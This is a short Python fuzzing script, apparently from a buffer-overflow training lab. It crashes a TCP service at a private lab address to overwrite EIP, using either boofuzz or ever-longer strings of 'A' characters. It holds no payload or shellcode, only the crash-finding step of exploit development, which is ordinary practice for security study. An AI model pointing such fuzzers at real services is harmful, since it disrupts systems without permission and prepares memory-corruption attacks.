#!/usr/bin/python3
# Crash the app and override the EIP
from boofuzz import *
import socket, time

host = '192.168.56.101'
port = 31337

def send_buffer(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Sending " + str(len(buffer)) + " bytes buffer")
    connect = s.connect((host, port))
    s.send(buffer + b"\r\n")
    # s.send(b"GET " + buffer + b" HTTP/1.1\r\n\r\n") # Fuzz an HTTP GET request parameter 
    print(s.recv(1024)) # because of this the program's execution will hang if the server stops responding
    print("Iteration done")
    s.close()
    time.sleep(0)

def boofuzz_fuzzing():
    print("Boofuzz started")
    session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')), sleep_time = 1)
    s_initialize("VULN") # Random string to name this fuzzing session
    s_string("USER", fuzzable=False)
    s_delim(" ", fuzzable=False)
    s_string("FUZZTHIS")
    session.connect(s_get("VULN"))
    session.fuzz()

def simple_fuzzing():
    buffer = b'A' * 100
    while len(buffer) < 10000:
        send_buffer(buffer)
        buffer = buffer + b'A' * 100
    print("Done")

# boofuzz_fuzzing()
# simple_fuzzing()
